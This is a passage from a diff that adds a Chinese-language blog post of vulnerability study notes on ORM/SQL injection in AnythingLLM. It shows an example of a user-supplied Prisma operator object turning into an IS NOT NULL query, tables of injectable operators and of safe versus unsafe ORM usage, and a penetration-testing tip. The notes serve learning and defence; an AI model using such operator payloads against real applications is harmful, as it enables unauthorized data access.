操纵 ORM 查询条件对象 → ORM 生成 SQL → 数据库执行</span><br><span class="line">  示例: &#123;&quot;ne&quot;: null&#125; → prisma.findMany(&#123;where: &#123;name: &#123;ne: null&#125;&#125;&#125;)</span><br><span class="line">       → SELECT * FROM users WHERE name IS NOT NULL</span><br></pre></td></tr></table></figure>
+
+<h3 id="ORM-注入的常见操作符"><a href="#ORM-注入的常见操作符" class="headerlink" title="ORM 注入的常见操作符"></a>ORM 注入的常见操作符</h3><table>
+<thead>
+<tr>
+<th>Prisma 操作符</th>
+<th>含义</th>
+<th>生成的 SQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#123;&quot;not&quot;: &quot;x&quot;&#125;</code></td>
+<td>不等于</td>
+<td><code>!= &#39;x&#39;</code></td>
+</tr>
+<tr>
+<td><code>&#123;&quot;contains&quot;: &quot;x&quot;&#125;</code></td>
+<td>包含</td>
+<td><code>LIKE &#39;%x%&#39;</code></td>
+</tr>
+<tr>
+<td><code>&#123;&quot;startsWith&quot;: &quot;x&quot;&#125;</code></td>
+<td>前缀匹配</td>
+<td><code>LIKE &#39;x%&#39;</code></td>
+</tr>
+<tr>
+<td><code>&#123;&quot;in&quot;: [&quot;a&quot;,&quot;b&quot;]&#125;</code></td>
+<td>在列表中</td>
+<td><code>IN (&#39;a&#39;,&#39;b&#39;)</code></td>
+</tr>
+<tr>
+<td><code>&#123;&quot;gt&quot;: 10&#125;</code></td>
+<td>大于</td>
+<td><code>&gt; 10</code></td>
+</tr>
+<tr>
+<td><code>&#123;&quot;lt&quot;: 10&#125;</code></td>
+<td>小于</td>
+<td><code>&lt; 10</code></td>
+</tr>
+<tr>
+<td><code>&#123;&quot;gte&quot;: 10&#125;</code></td>
+<td>大于等于</td>
+<td><code>&gt;= 10</code></td>
+</tr>
+</tbody></table>
+<h3 id="为什么-ORM-不能完全防止-SQL-注入"><a href="#为什么-ORM-不能完全防止-SQL-注入" class="headerlink" title="为什么 ORM 不能完全防止 SQL 注入"></a>为什么 ORM 不能完全防止 SQL 注入</h3><p>很多人认为”使用了 ORM 就不会有 SQL 注入”，这是<strong>错误的</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>是否安全</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ORM 参数化查询（<code>where: &#123;id: userInput&#125;</code>）</td>
+<td><strong>安全</strong> — ORM 自动参数化</td>
+</tr>
+<tr>
+<td>ORM where 条件接受用户 JSON（<code>where: req.body</code>）</td>
+<td><strong>不安全</strong> — 可操纵查询逻辑</td>
+</tr>
+<tr>
+<td>ORM 原始查询拼接（<code>$queryRawUnsafe</code>）</td>
+<td><strong>不安全</strong> — 等同传统 SQL 注入</td>
+</tr>
+<tr>
+<td>ORM 原始查询参数化（<code>$queryRaw</code> + 参数）</td>
+<td><strong>安全</strong> — 参数化处理</td>
+</tr>
+</tbody></table>
+<p><strong>核心原则</strong>：ORM 安全的前提是<strong>开发者正确使用</strong>。只要将用户可控数据传入 ORM 的查询条件结构中，就可能产生 ORM 注入。</p>
+<hr>
+<blockquote>
+<p><strong>学习建议</strong>：在实际渗透测试中，遇到使用 Node.js + Prisma 技术栈的应用时，重点关注 API 端点是否将 <code>req.body</code> 中的字段直接传入 Prisma 的 <code>where</code> 条件。这是 ORM 注入最常见的模式。同时，任何涉及”Agent 连接数据库”的功能，都应检查是否存在原始 SQL 拼接。</p>
+</blockquote>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://forkmmat.github.io/2026/07/21/AnythingLLM%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://forkmmat.github.io/2026/07/21/AnythingLLM%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/AnythingLLM/"># AnythingLLM</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/API%E5%AE%89%E5%85%A8/"># API安全</a>
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"># 漏洞学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2026/07/21/XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">XMLDecoder 反序列化漏洞复现笔记</a>
+            
+            
+            <a class="next" rel="next" href="/2026/06/09/16-%E5%8F%8D%E9%97%AE%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E9%A2%98/">反问面试官问题</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
